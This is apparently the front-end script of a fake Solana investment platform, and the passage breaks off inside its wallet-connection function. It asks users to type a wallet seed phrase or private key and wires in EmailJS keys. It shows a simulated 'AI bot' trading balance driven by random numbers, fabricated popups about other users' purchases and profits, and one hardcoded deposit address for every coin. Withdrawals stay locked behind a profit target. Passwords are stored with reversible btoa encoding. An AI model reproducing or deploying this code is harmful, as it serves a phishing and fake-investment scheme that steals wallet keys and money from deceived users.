// ==============================================
// SOLANA DAPPS ENTERPRISE - COMPLETE FIXED VERSION
// ==============================================

// GLOBAL STATE MANAGEMENT
let AUTH_SYSTEM = null;
let PLATFORM = null;
let EMAILJS_INITIALIZED = false;

// ==============================================
// 1. EMAILJS CONFIGURATION
// ==============================================
const EMAILJS_CONFIG = {
    PUBLIC_KEY: 'sEeIF-0T9vylyhFIS',
    SERVICE_ID: 'service_wtoqc3o',
    TEMPLATE_ID: 'template_hih45ne'
};

// ==============================================
// 2. INITIALIZATION
// ==============================================
document.addEventListener('DOMContentLoaded', function() {
    console.log('🚀 Initializing Solana DApps Platform...');
    
    // Clean previous state
    cleanupPreviousSession();
    
    // Initialize EmailJS once
    initializeEmailJS();
    
    // Initialize auth system
    AUTH_SYSTEM = new AuthSystem();
    
    // Check for existing session
    checkExistingSession();
    
    // Setup global event listeners
    setupGlobalListeners();
    
    console.log('✅ Platform initialized');
});

// ==============================================
// 3. UTILITY FUNCTIONS
// ==============================================
function cleanupPreviousSession() {
    // Clear only temporary session data
    sessionStorage.removeItem('auto_login_attempted');
    
    // Reset form inputs
    const forms = ['loginForm', 'signupForm', 'forgotPasswordForm'];
    forms.forEach(formId => {
        const form = document.getElementById(formId);
        if (form) form.reset();
    });
    
    // Clear validation messages
    document.querySelectorAll('.validation-message').forEach(msg => {
        msg.style.display = 'none';
        msg.className = 'validation-message';
    });
    
    // Clear alerts
    document.querySelectorAll('.alert').forEach(alert => {
        alert.style.display = 'none';
    });
}

function initializeEmailJS() {
    if (typeof emailjs === 'undefined') {
        console.warn('⚠️ EmailJS not loaded');
        return;
    }
    
    try {
        emailjs.init(EMAILJS_CONFIG.PUBLIC_KEY);
        EMAILJS_INITIALIZED = true;
        console.log('✅ EmailJS initialized');
    } catch (error) {
        console.error('❌ EmailJS initialization failed:', error);
    }
}

function checkExistingSession() {
    const hasLocalUser = localStorage.getItem('current_user');
    const hasSessionUser = sessionStorage.getItem('current_user');
    
    if (hasLocalUser || hasSessionUser) {
        PLATFORM = new Web3Platform();
        setTimeout(() => {
            if (PLATFORM && typeof PLATFORM.init === 'function') {
                PLATFORM.init();
            }
        }, 300);
    }
}

function setupGlobalListeners() {
    // Escape key handlers
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') {
            // Close modal if open
            const modal = document.getElementById('walletModal');
            if (modal && modal.style.display === 'block') {
                if (PLATFORM) PLATFORM.closeModal();
            }
            
            // Close receipt modal
            const receiptModal = document.getElementById('receiptModal');
            if (receiptModal && receiptModal.style.display === 'block') {
                closeReceiptModal();
            }
            
            // Close generic modal
            const genericModal = document.getElementById('modalOverlay');
            if (genericModal && genericModal.style.display === 'flex') {
                closeModal();
            }
        }
    });
    
    // Prevent form submission on Enter in search/input fields
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Enter' && e.target.tagName === 'INPUT' && !e.target.closest('form')) {
            e.preventDefault();
        }
    });
}

// ==============================================
// 4. AUTHENTICATION SYSTEM
// ==============================================
class AuthSystem {
    constructor() {
        this.users = JSON.parse(localStorage.getItem('solana_users')) || [];
        this.currentUser = null;
        this.rememberMe = localStorage.getItem('remember_me') === 'true';
        this.rememberMeData = JSON.parse(localStorage.getItem('remember_me_data') || '{}');
        
        this.init();
    }
    
    init() {
        this.setupParticles();
        this.setupEventListeners();
        this.loadRememberedCredentials();
        this.setupMobileMenu();
        this.checkAuthStatus();
        this.createDemoUsers();
    }
    
    setupEventListeners() {
        // Tab switching
        document.querySelectorAll('.auth-tab').forEach(tab => {
            tab.addEventListener('click', (e) => {
                e.preventDefault();
                this.switchTab(tab.dataset.tab);
            });
        });
        
        // Form submissions
        const loginForm = document.getElementById('loginForm');
        if (loginForm) {
            loginForm.addEventListener('submit', (e) => {
                e.preventDefault();
                this.handleLogin();
            });
        }
        
        const signupForm = document.getElementById('signupForm');
        if (signupForm) {
            signupForm.addEventListener('submit', (e) => {
                e.preventDefault();
                this.handleSignup();
            });
        }
        
        // Forgot password
        const forgotPasswordLink = document.querySelector('.forgot-password');
        if (forgotPasswordLink) {
            forgotPasswordLink.addEventListener('click', (e) => {
                e.preventDefault();
                this.switchTab('forgot');
            });
        }
        
        // Real-time validation
        this.setupValidation();
    }
    
    setupValidation() {
        // Email validation
        ['loginEmail', 'signupEmail', 'forgotEmail'].forEach(id => {
            const input = document.getElementById(id);
            if (input) {
                input.addEventListener('blur', () => this.validateEmail(input.value, id));
                input.addEventListener('input', () => {
                    if (input.value) this.validateEmail(input.value, id);
                });
            }
        });
        
        // Password validation
        ['loginPassword', 'signupPassword'].forEach(id => {
            const input = document.getElementById(id);
            if (input) {
                input.addEventListener('input', () => {
                    this.validatePassword(input.value, id);
                });
            }
        });
        
        // Confirm password
        const confirmInput = document.getElementById('signupConfirmPassword');
        if (confirmInput) {
            confirmInput.addEventListener('input', () => {
                const password = document.getElementById('signupPassword').value;
                this.validateConfirmPassword(password, confirmInput.value);
            });
        }
    }
    
    validateEmail(email, fieldId) {
        const errorId = `${fieldId}Error`;
        const errorElement = document.getElementById(errorId);
        
        if (!email) {
            this.showValidation(errorElement, 'Email is required', false);
            return false;
        }
        
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(email)) {
            this.showValidation(errorElement, 'Invalid email format', false);
            return false;
        }
        
        this.showValidation(errorElement, 'Valid email', true);
        return true;
    }
    
    validatePassword(password, fieldId) {
        const errorId = `${fieldId}Error`;
        const errorElement = document.getElementById(errorId);
        
        if (!password) {
            this.showValidation(errorElement, 'Password required', false);
            return false;
        }
        
        if (password.length < 8) {
            this.showValidation(errorElement, 'Minimum 8 characters', false);
            return false;
        }
        
        this.showValidation(errorElement, 'Valid password', true);
        return true;
    }
    
    validateConfirmPassword(password, confirmPassword) {
        const errorElement = document.getElementById('signupConfirmError');
        
        if (!confirmPassword) {
            this.showValidation(errorElement, 'Confirm password', false);
            return false;
        }
        
        if (password !== confirmPassword) {
            this.showValidation(errorElement, 'Passwords do not match', false);
            return false;
        }
        
        this.showValidation(errorElement, 'Passwords match', true);
        return true;
    }
    
    showValidation(element, message, isValid) {
        if (!element) return;
        
        element.innerHTML = `
            <i class="fas fa-${isValid ? 'check-circle' : 'exclamation-circle'}"></i>
            ${message}
        `;
        element.className = `validation-message show ${isValid ? 'valid' : ''}`;
    }
    
    async handleLogin() {
        const email = document.getElementById('loginEmail').value.trim().toLowerCase();
        const password = document.getElementById('loginPassword').value;
        const rememberMe = document.getElementById('rememberMe')?.checked || false;
        const loginButton = document.getElementById('loginButton');
        
        // Validate
        if (!this.validateEmail(email, 'loginEmail') || !this.validatePassword(password, 'loginPassword')) {
            this.showAlert('login', 'Fix validation errors', 'error');
            return;
        }
        
        // Show loading
        if (loginButton) {
            loginButton.disabled = true;
            loginButton.innerHTML = '<span class="loading-spinner"></span> Signing in...';
        }
        
        try {
            await new Promise(resolve => setTimeout(resolve, 800));
            
            const user = this.users.find(u => 
                u.email === email && u.password === this.hashPassword(password)
            );
            
            if (!user) {
                throw new Error('Invalid credentials');
            }
            
            // Update user
            user.rememberMe = rememberMe;
            const userIndex = this.users.findIndex(u => u.id === user.id);
            if (userIndex !== -1) {
                this.users[userIndex] = user;
                localStorage.setItem('solana_users', JSON.stringify(this.users));
            }
            
            // Set current user
            this.currentUser = {
                id: user.id,
                name: user.name,
                email: user.email,
                createdAt: user.createdAt,
                rememberMe: rememberMe
            };
            
            // Save based on remember me
            if (rememberMe) {
                localStorage.setItem('current_user', JSON.stringify(this.currentUser));
                localStorage.setItem('remember_me', 'true');
                this.saveRememberedCredentials(email, password);
            } else {
                sessionStorage.setItem('current_user', JSON.stringify(this.currentUser));
                localStorage.removeItem('current_user');
                localStorage.setItem('remember_me', 'false');
                this.rememberMeData = {};
                localStorage.setItem('remember_me_data', JSON.stringify(this.rememberMeData));
            }
            
            this.showAlert('login', 'Login successful!', 'success');
            
            setTimeout(() => {
                this.redirectToApp();
            }, 800);
            
        } catch (error) {
            this.showAlert('login', error.message, 'error');
        } finally {
            if (loginButton) {
                loginButton.disabled = false;
                loginButton.innerHTML = '<span>Sign In</span>';
            }
        }
    }
    
    async handleSignup() {
        const name = document.getElementById('signupName').value.trim();
        const email = document.getElementById('signupEmail').value.trim().toLowerCase();
        const password = document.getElementById('signupPassword').value;
        const confirmPassword = document.getElementById('signupConfirmPassword').value;
        const termsAgree = document.getElementById('termsAgree').checked;
        const signupButton = document.getElementById('signupButton');
        
        // Validate
        if (!name) {
            this.showValidation(document.getElementById('signupNameError'), 'Name required', false);
            this.showAlert('signup', 'Fill all fields', 'error');
            return;
        }
        
        if (!this.validateEmail(email, 'signupEmail') || 
            !this.validatePassword(password, 'signupPassword') ||
            !this.validateConfirmPassword(password, confirmPassword)) {
            this.showAlert('signup', 'Fix validation errors', 'error');
            return;
        }
        
        if (!termsAgree) {
            this.showValidation(document.getElementById('termsError'), 'Agree to terms', false);
            this.showAlert('signup', 'Agree to terms', 'error');
            return;
        }
        
        // Show loading
        if (signupButton) {
            signupButton.disabled = true;
            signupButton.innerHTML = '<span class="loading-spinner"></span> Creating...';
        }
        
        try {
            // Check if user exists
            if (this.users.some(u => u.email === email)) {
                throw new Error('Email already exists');
            }
            
            await new Promise(resolve => setTimeout(resolve, 800));
            
            // Create user
            const newUser = {
                id: 'user_' + Date.now(),
                name: name,
                email: email,
                password: this.hashPassword(password),
                createdAt: new Date().toISOString(),
                verified: false,
                rememberMe: false
            };
            
            this.users.push(newUser);
            localStorage.setItem('solana_users', JSON.stringify(this.users));
            
            // Set current user
            this.currentUser = {
                id: newUser.id,
                name: newUser.name,
                email: newUser.email,
                createdAt: newUser.createdAt,
                rememberMe: false
            };
            
            sessionStorage.setItem('current_user', JSON.stringify(this.currentUser));
            localStorage.setItem('remember_me', 'false');
            
            this.showAlert('signup', 'Account created!', 'success');
            
            setTimeout(() => {
                this.redirectToApp();
            }, 800);
            
        } catch (error) {
            this.showAlert('signup', error.message, 'error');
        } finally {
            if (signupButton) {
                signupButton.disabled = false;
                signupButton.innerHTML = '<span>Create Account</span>';
            }
        }
    }
    
    redirectToApp() {
        document.getElementById('authContainer').style.display = 'none';
        document.getElementById('mainApp').classList.add('active');
        
        this.updateUserProfile();
        this.initializePlatform();
    }
    
    updateUserProfile() {
        if (!this.currentUser) return;
        
        const userAvatar = document.getElementById('userAvatar');
        const userName = document.getElementById('userName');
        const userEmail = document.getElementById('userEmail');
        
        if (userAvatar) {
            const initials = this.currentUser.name
                .split(' ')
                .map(n => n[0])
                .join('')
                .toUpperCase()
                .slice(0, 2);
            userAvatar.textContent = initials;
        }
        
        if (userName) userName.textContent = this.currentUser.name;
        if (userEmail) userEmail.textContent = this.currentUser.email;
        
        const userProfile = document.getElementById('userProfile');
        if (userProfile) userProfile.style.display = 'flex';
    }
    
    initializePlatform() {
        if (!PLATFORM) {
            PLATFORM = new Web3Platform();
        }
        PLATFORM.currentUser = this.currentUser;
        
        setTimeout(() => {
            PLATFORM.init();
        }, 100);
    }
    
    logout() {
        // Clear all persistence
        localStorage.removeItem('wallet_connected');
        localStorage.removeItem('purchase_verified');
        localStorage.removeItem('platform_remember_me');
        sessionStorage.removeItem('current_user');
        localStorage.removeItem('current_user');
        localStorage.removeItem('remember_me');
        localStorage.removeItem('remember_me_data');
        
        // Reset platform
        if (PLATFORM) {
            PLATFORM.stopAutoTrading();
            PLATFORM.isWalletConnected = false;
            PLATFORM.hasPurchased = false;
            PLATFORM.rememberMeData = {};
            PLATFORM = null;
        }
        
        // Reset auth
        this.currentUser = null;
        this.rememberMe = false;
        this.rememberMeData = {};
        
        // Reset UI
        document.getElementById('mainApp').classList.remove('active');
        document.getElementById('authContainer').style.display = 'flex';
        
        // Clear forms
        this.clearAlerts();
        this.clearValidationMessages();
        this.switchTab('login');
        
        // Close mobile menu
        const navMenu = document.getElementById('navMenu');
        if (navMenu) navMenu.classList.remove('active');
        
        console.log('👋 User logged out');
    }
    
    // Helper methods
    switchTab(tabName) {
        document.querySelectorAll('.auth-form').forEach(form => {
            form.classList.remove('active');
            form.style.display = 'none';
        });
        
        document.querySelectorAll('.forgot-password-form').forEach(form => {
            form.classList.remove('active');
            form.style.display = 'none';
        });
        
        document.querySelectorAll('.auth-tab').forEach(tab => {
            tab.classList.remove('active');
            if (tab.dataset.tab === tabName) {
                tab.classList.add('active');
            }
        });
        
        if (tabName === 'forgot') {
            const form = document.getElementById('forgotPasswordForm');
            if (form) {
                form.classList.add('active');
                form.style.display = 'block';
            }
        } else {
            const form = document.getElementById(`${tabName}Form`);
            if (form) {
                form.classList.add('active');
                form.style.display = 'block';
            }
        }
        
        this.clearAlerts();
        this.clearValidationMessages();
    }
    
    showAlert(formId, message, type = 'error') {
        const alertDiv = document.getElementById(`${formId}Alert`);
        if (!alertDiv) return;
        
        const icons = {
            error: 'exclamation-circle',
            success: 'check-circle',
            warning: 'exclamation-triangle'
        };
        
        alertDiv.className = `alert alert-${type}`;
        alertDiv.innerHTML = `
            <i class="fas fa-${icons[type] || 'info-circle'}"></i>
            <span>${message}</span>
        `;
        alertDiv.style.display = 'flex';
        
        setTimeout(() => {
            alertDiv.style.display = 'none';
        }, 5000);
    }
    
    clearAlerts() {
        document.querySelectorAll('.alert').forEach(alert => {
            alert.style.display = 'none';
        });
    }
    
    clearValidationMessages() {
        document.querySelectorAll('.validation-message').forEach(msg => {
            msg.style.display = 'none';
        });
    }
    
    hashPassword(password) {
        return btoa(password);
    }
    
    loadRememberedCredentials() {
        if (this.rememberMe && this.rememberMeData.email && this.rememberMeData.password) {
            setTimeout(() => {
                const emailInput = document.getElementById('loginEmail');
                const passwordInput = document.getElementById('loginPassword');
                const rememberMeCheckbox = document.getElementById('rememberMe');
                
                if (emailInput && passwordInput && rememberMeCheckbox) {
                    emailInput.value = this.rememberMeData.email;
                    passwordInput.value = this.rememberMeData.password;
                    rememberMeCheckbox.checked = true;
                    
                    emailInput.setAttribute('data-user-filled', 'true');
                    passwordInput.setAttribute('data-user-filled', 'true');
                }
            }, 100);
        }
    }
    
    saveRememberedCredentials(email, password) {
        if (this.rememberMe) {
            this.rememberMeData = {
                email: email,
                password: password,
                lastLogin: new Date().toISOString()
            };
            localStorage.setItem('remember_me_data', JSON.stringify(this.rememberMeData));
        }
    }
    
    checkAuthStatus() {
        const sessionUser = sessionStorage.getItem('current_user');
        const localUser = localStorage.getItem('current_user');
        
        if (localUser) {
            this.currentUser = JSON.parse(localUser);
            this.rememberMe = true;
            this.redirectToApp();
        } else if (sessionUser) {
            this.currentUser = JSON.parse(sessionUser);
            this.rememberMe = false;
            this.redirectToApp();
        }
    }
    
    createDemoUsers() {
        if (this.users.length === 0) {
            const demoUser = {
                id: 'demo_user',
                name: "kelly West",
                email: "west@example.com",
                password: this.hashPassword("West123!"),
                createdAt: new Date().toISOString(),
                verified: false,
                rememberMe: false
            };
            this.users.push(demoUser);
            localStorage.setItem('solana_users', JSON.stringify(this.users));
        }
    }
    
    setupParticles() {
        const canvas = document.getElementById('particlesCanvas');
        if (!canvas) return;
        
        const ctx = canvas.getContext('2d');
        
        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        
        resizeCanvas();
        window.addEventListener('resize', resizeCanvas);
        
        const particles = [];
        const particleCount = Math.min(80, Math.floor(window.innerWidth / 10));
        
        for (let i = 0; i < particleCount; i++) {
            particles.push({
                x: Math.random() * canvas.width,
                y: Math.random() * canvas.height,
                size: Math.random() * 2 + 1,
                speedX: (Math.random() - 0.5) * 0.5,
                speedY: (Math.random() - 0.5) * 0.5,
                color: Math.random() > 0.5 ? 'rgba(153, 69, 255, 0.4)' : 'rgba(20, 241, 149, 0.4)'
            });
        }
        
        function animate() {
            ctx.fillStyle = 'rgba(5, 8, 16, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            particles.forEach(particle => {
                particle.x += particle.speedX;
                particle.y += particle.speedY;
                
                if (particle.x <= 0 || particle.x >= canvas.width) particle.speedX *= -1;
                if (particle.y <= 0 || particle.y >= canvas.height) particle.speedY *= -1;
                
                ctx.beginPath();
                ctx.fillStyle = particle.color;
                ctx.arc(particle.x, particle.y, particle.size, 0, Math.PI * 2);
                ctx.fill();
            });
            
            requestAnimationFrame(animate);
        }
        
        animate();
    }
    
    setupMobileMenu() {
        const menuToggle = document.getElementById('menuToggle');
        const navMenu = document.getElementById('navMenu');
        
        if (!menuToggle || !navMenu) return;
        
        menuToggle.addEventListener('click', (e) => {
            e.stopPropagation();
            navMenu.classList.toggle('active');
        });
        
        document.addEventListener('click', (e) => {
            if (window.innerWidth < 1024) {
                if (!navMenu.contains(e.target) && !menuToggle.contains(e.target)) {
                    navMenu.classList.remove('active');
                }
            }
        });
        
        navMenu.querySelectorAll('.nav-link').forEach(link => {
            link.addEventListener('click', () => {
                if (window.innerWidth < 1024) {
                    navMenu.classList.remove('active');
                }
            });
        });
        
        window.addEventListener('resize', () => {
            if (window.innerWidth >= 1024) {
                navMenu.classList.remove('active');
            }
        });
    }
}

// ==============================================
// 5. WEB3 PLATFORM
// ==============================================
class Web3Platform {
    constructor() {
        // Configuration
        this.wallets = [
            { id: 'phantom', name: 'Phantom', color: '#ab9ff2' },
            { id: 'solflare', name: 'Solflare', color: '#ffffff' },
            { id: 'metamask', name: 'MetaMask', color: '#f6851b' },
            { id: 'trust', name: 'Trust Wallet', color: '#3375bb' },
            { id: 'other', name: 'Other Wallet', color: '#ff6b35' }
        ];
        
        // State
        this.hasPurchased = this.loadBooleanState('purchase_verified');
        this.isWalletConnected = this.loadBooleanState('wallet_connected');
        this.currentView = 'dashboard';
        
        // Watch trading
        this.watchBalance = 1250.00;
        this.watchProfit = 0.00;
        this.watchTarget = 2000.00;
        this.watchSuccessRate = 0.65;
        this.autoTradeInterval = null;
        this.isAutoTrading = false;
        this.tradeLog = [];
        this.dayCount = 0;
        
        // Purchase data
        this.purchaseData = null;
        
        // Modal state
        this.modal = document.getElementById('walletModal');
        this.isConnecting = false;
        this.selectedWallet = null;
        this.currentCredentialType = 'phrase';
        this.isValidPhrase = false;
        this.isValidPrivateKey = false;
        
        // User
        this.currentUser = null;
        
        // Flow state
        this.flowState = {
            step: 1,
            completedSteps: []
        };
        
        // Crypto data
        this.currentSolPrice = 100.00;
        this.selectedCrypto = 'sol';
        this.cryptoPrices = {
            sol: 100.00,
            usdc: 1.00,
            bonk: 0.00002567,
            wif: 3.21
        };
        
        this.cryptoAddresses = {
            sol: 'BYQ4hP7nzETTnvUyVsgCxqGEAKUgScZAjhi8jG44rcLb',
            usdc: 'BYQ4hP7nzETTnvUyVsgCxqGEAKUgScZAjhi8jG44rcLb',
            bonk: 'BYQ4hP7nzETTnvUyVsgCxqGEAKUgScZAjhi8jG44rcLb',
            wif: 'BYQ4hP7nzETTnvUyVsgCxqGEAKUgScZAjhi8jG44rcLb'
        };
        
        // Live notifications
        this.popupMessages = [
            "User just bought 5 SOL at $100.00",
            "Payment verified successfully",
            "Watch trading unlocked for new user",
            "Transaction confirmed on Solana",
            "Receipt generated for purchase",
            "AI bot made $45.23 profit",
            "New wallet connected: Phantom",
            "Withdrawal target: 65% complete"
        ];
    }
    
    loadBooleanState(key) {
        const value = localStorage.getItem(key);
        return value === 'true';
    }
    
    saveBooleanState(key, value) {
        localStorage.setItem(key, value.toString());
    }
    
    init() {
        console.log('🚀 Initializing Web3 Platform...');
        
        try {
            // Setup components
            this.initRouter();
            this.renderWallets();
            this.setupEventListeners();
            this.animateStats();
            this.initScrollAnimations();
            this.initTabSystem();
            this.initServiceModals();
            this.initValidationListeners();
            this.initBuyCoinFeature();
            this.initLivePopups();
            this.initLiveSolanaPrice();
            this.initWatchTradingSystem();
            
            // Restore state
            this.loadRememberedState();
            
            // Initial access check
            setTimeout(() => {
                this.checkWatchTradingAccess();
                
                if (window.location.hash === '#watch-trade') {
                    this.checkWatchTradingAccess();
                }
            }, 300);
            
            console.log('✅ Web3 Platform ready');
            this.showNotification('Platform ready!', 'success');
            
        } catch (error) {
            console.error('❌ Platform init error:', error);
            this.showNotification('Initialization failed', 'error');
        }
    }
    
    loadRememberedState() {
        const rememberMe = localStorage.getItem('remember_me') === 'true';
        if (rememberMe) {
            const data = JSON.parse(localStorage.getItem('platform_remember_me') || '{}');
            this.isWalletConnected = data.walletConnected || false;
            this.hasPurchased = data.hasPurchased || false;
        }
    }
    
    saveRememberedState() {
        const rememberMe = localStorage.getItem('remember_me') === 'true';
        if (rememberMe && this.currentUser) {
            const data = {
                walletConnected: this.isWalletConnected,
                hasPurchased: this.hasPurchased,
                lastConnected: new Date().toISOString()
            };
            localStorage.setItem('platform_remember_me', JSON.stringify(data));
        }
    }
    
    // ============ ROUTER ============
    initRouter() {
        const hash = window.location.hash.substring(1) || 'dashboard';
        this.switchView(hash);
        
        window.addEventListener('hashchange', () => {
            const newHash = window.location.hash.substring(1) || 'dashboard';
            this.switchView(newHash);
        });
        
        this.updateNavLinks();
    }
    
    switchView(viewName) {
        const validViews = ['dashboard', 'buy', 'verify', 'watch-trade'];
        if (!validViews.includes(viewName)) {
            viewName = 'dashboard';
            window.location.hash = '#dashboard';
        }
        
        document.querySelectorAll('.app-view').forEach(view => {
            view.classList.remove('active');
        });
        
        const targetView = document.getElementById(`${viewName}-view`);
        if (targetView) {
            targetView.classList.add('active');
            this.currentView = viewName;
            
            this.updateNavLinks();
            
            // View-specific init
            switch(viewName) {
                case 'buy':
                    setTimeout(() => {
                        this.selectCrypto('sol');
                        this.updateConfirmButton();
                    }, 100);
                    break;
                case 'verify':
                    if (this.purchaseData && !this.flowState.completedSteps.includes('verified')) {
                        setTimeout(() => {
                            this.showNotification('Purchase detected. Ready for verification.', 'info');
                        }, 500);
                    }
                    break;
                case 'watch-trade':
                    this.checkWatchTradingAccess();
                    break;
            }
        }
    }
    
    updateNavLinks() {
        document.querySelectorAll('.nav-link').forEach(link => {
            const view = link.getAttribute('data-view');
            if (view === this.currentView) {
                link.classList.add('active');
            } else {
                link.classList.remove('active');
            }
        });
    }
    
    // ============ WATCH TRADING ============
    checkWatchTradingAccess() {
        const lockedEl = document.getElementById('watchTradingLocked');
        const platformEl = document.getElementById('watchTradingPlatform');
        
        if (this.isWalletConnected && this.hasPurchased) {
            if (lockedEl) lockedEl.style.display = 'none';
            if (platformEl) {
                platformEl.style.display = 'block';
                this.updateWatchTradingDisplay();
            }
            if (!this.flowState.completedSteps.includes('watch_trade_unlocked')) {
                this.flowState.completedSteps.push('watch_trade_unlocked');
            }
        } else {
            if (lockedEl) lockedEl.style.display = 'block';
            if (platformEl) platformEl.style.display = 'none';
        }
    }
    
    initWatchTradingSystem() {
        this.checkWatchTradingAccess();
        console.log('✅ Watch trading system ready');
    }
    
    updateWatchTradingDisplay() {
        // Update balance
        const balanceEl = document.getElementById('watchCurrentBalance');
        const profitEl = document.getElementById('watchTotalProfit');
        const successRateEl = document.getElementById('watchSuccessRate');
        const progressFill = document.getElementById('watchProgressFill');
        const withdrawalMessage = document.getElementById('watchWithdrawalMessage');
        
        if (balanceEl) balanceEl.textContent = `$${this.watchBalance.toFixed(2)}`;
        if (profitEl) profitEl.textContent = `$${this.watchProfit.toFixed(2)}`;
        if (successRateEl) successRateEl.textContent = `${Math.round(this.watchSuccessRate * 100)}%`;
        
        // Update progress
        const progressPercent = Math.min((this.watchProfit / this.watchTarget) * 100, 100);
        if (progressFill) progressFill.style.width = `${progressPercent}%`;
        
        // Update withdrawal message
        if (withdrawalMessage) {
            if (this.watchProfit >= this.watchTarget) {
                withdrawalMessage.innerHTML = `<i class="fas fa-unlock" style="color: #14F195;"></i> Withdrawals unlocked! Target reached.`;
                withdrawalMessage.style.color = '#14F195';
                if (this.isAutoTrading) {
                    this.stopAutoTrading();
                }
            } else {
                const remaining = this.watchTarget - this.watchProfit;
                withdrawalMessage.innerHTML = `<i class="fas fa-lock" style="color: #FF6B6B;"></i> Need $${remaining.toFixed(2)} more profit. Day ${this.dayCount + 1} of process.`;
                withdrawalMessage.style.color = 'rgba(255, 255, 255, 0.8)';
            }
        }
        
        this.updateTradeLog();
    }
    
    startAutoTrading() {
        if (this.isAutoTrading) return;
        
        this.isAutoTrading = true;
        this.dayCount = 0;
        this.watchProfit = 0;
        this.tradeLog = [];
        
        this.addTradeLog('AI bot initialized. Starting simulation.', 'info');
        this.addTradeLog(`Day 1: Starting with $1,250.00. Target: $${this.watchTarget} profit.`, 'info');
        
        // Trading interval
        this.autoTradeInterval = setInterval(() => {
            this.executeAutoTrade();
        }, 5000);
        
        // Update button
        const startBtn = document.getElementById('startTradingBtn');
        if (startBtn) {
            startBtn.innerHTML = `<i class="fas fa-pause"></i> Stop Watching`;
            startBtn.onclick = () => this.stopAutoTrading();
        }
        
        this.showNotification('Watch trading started', 'success');
    }
    
    stopAutoTrading() {
        if (this.autoTradeInterval) {
            clearInterval(this.autoTradeInterval);
            this.autoTradeInterval = null;
        }
        this.isAutoTrading = false;
        this.addTradeLog('Auto-trading stopped.', 'info');
        
        // Update button
        const startBtn = document.getElementById('startTradingBtn');
        if (startBtn) {
            startBtn.innerHTML = `<i class="fas fa-play"></i> Start Watching`;
            startBtn.onclick = () => this.startAutoTrading();
        }
    }
    
    executeAutoTrade() {
        if (!this.isAutoTrading) return;
        
        const isSuccessful = Math.random() < this.watchSuccessRate;
        const tradeAmount = 30 + Math.random() * 70;
        let profitLoss = 0;
        const tradeType = Math.random() > 0.5 ? 'BUY' : 'SELL';
        
        if (isSuccessful) {
            const profitPercent = 0.01 + Math.random() * 0.04;
            profitLoss = tradeAmount * profitPercent;
            this.watchProfit += profitLoss;
            
            this.addTradeLog(`${tradeType} SOL: $${profitLoss.toFixed(2)} profit on $${tradeAmount.toFixed(2)}`, 'profit');
            
            if (this.watchProfit >= this.watchTarget) {
                this.dayCount = Math.min(14, this.dayCount + 1);
                this.addTradeLog(`🎉 TARGET REACHED! $${this.watchProfit.toFixed(2)} profit.`, 'success');
                this.stopAutoTrading();
            }
        } else {
            const lossPercent = 0.02 + Math.random() * 0.06;
            profitLoss = -(tradeAmount * lossPercent);
            this.watchProfit += profitLoss;
            if (this.watchProfit < 0) this.watchProfit = 0;
            
            this.addTradeLog(`${tradeType} SOL: $${Math.abs(profitLoss).toFixed(2)} loss on $${tradeAmount.toFixed(2)}`, 'loss');
        }
        
        // Increment day
        if (this.tradeLog.length % 8 === 0) {
            this.dayCount++;
        }
        
        this.updateWatchTradingDisplay();
    }
    
    addTradeLog(message, type = 'info') {
        const logContent = document.getElementById('tradingLogContent');
        if (!logContent) return;
        
        const now = new Date();
        const timestamp = now.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
        
        const logEntry = document.createElement('div');
        logEntry.className = 'log-entry';
        
        let formattedMessage = message;
        if (type === 'profit') {
            formattedMessage = `<span class="log-profit">${message}</span>`;
        } else if (type === 'loss') {
            formattedMessage = `<span class="log-loss">${message}</span>`;
        } else if (type === 'success') {
            formattedMessage = `<span style="color: #14F195; font-weight: 700;">${message}</span>`;
        }
        
        logEntry.innerHTML = `<span class="log-timestamp">[${timestamp}]</span> ${formattedMessage}`;
        
        logContent.appendChild(logEntry);
        
        // Limit entries
        if (logContent.children.length > 20) {
            logContent.removeChild(logContent.children[0]);
        }
        
        // Scroll to bottom
        logContent.scrollTop = logContent.scrollHeight;
    }
    
    updateTradeLog() {
        const logContent = document.getElementById('tradingLogContent');
        if (!logContent) return;
        
        if (this.tradeLog.length === 0) {
            logContent.innerHTML = `
                <div class="log-entry">
                    <span class="log-timestamp">[${new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'})}]</span>
                    <span>AI bot ready. Click "Start Watching" to begin.</span>
                </div>
            `;
        }
    }
    
    // ============ WALLET CONNECTION ============
    renderWallets() {
        const container = document.getElementById('walletGrid');
        if (!container) return;
        
        container.innerHTML = '';
        
        this.wallets.forEach((wallet, index) => {
            const item = document.createElement('div');
            item.className = 'wallet-item';
            item.dataset.wallet = wallet.id;
            item.style.animationDelay = `${index * 0.1}s`;
            item.innerHTML = `
                <div class="wallet-icon" style="background: ${wallet.color}">
                    <i class="fas fa-wallet"></i>
                </div>
                <div class="wallet-name">${wallet.name}</div>
            `;
            item.addEventListener('click', () => this.handleWalletSelect(wallet));
            container.appendChild(item);
        });
    }
    
    handleWalletSelect(wallet) {
        this.selectedWallet = wallet;
        this.showCredentialsView();
    }
    
    showCredentialsView() {
        this.showView('credentialsView');
        this.resetProgressBars();
        this.resetValidation();
    }
    
    showLoading() {
        this.showView('loadingView');
        this.startLoadingAnimation();
    }
    
    showFailed() {
        this.showView('failedView');
        this.resetProgressBars();
    }
    
    showError() {
        this.showView('errorView');
        this.resetProgressBars();
    }
    
    showWalletSelection() {
        this.showView('walletSelectionView');
        this.selectedWallet = null;
        this.resetValidation();
    }
    
    showView(viewName) {
        document.querySelectorAll('.view').forEach(view => {
            view.classList.remove('active');
            view.style.display = 'none';
        });
        
        const targetView = document.getElementById(viewName);
        if (targetView) {
            targetView.classList.add('active');
            targetView.style.display = 'block';
        }
    }
    
    async connectWithCredentials() {
        if (this.isConnecting) return;
        
        let credentials = '';
        let credentialType = '';
        
        if (this.currentCredentialType === 'phrase') {
            const phraseInput = document.getElementById('phraseInput');
            if (!phraseInput) return;
            
            credentials = phraseInput.value.trim();
            credentialType = '12-word pass phrase';
            
            if (!this.validatePhrase(credentials)) {
                this.showNotification('Invalid phrase format', 'error');
                return;
            }
        } else {
            const privateKeyInput = document.getElementById('privateKeyInput');
            if (!privateKeyInput) return;
            
            credentials = privateKeyInput.value.trim();
            credentialType = '64-character private key';
            
            if (!this.validatePrivateKey(credentials)) {
                this.showNotification('Invalid private key format', 'error');
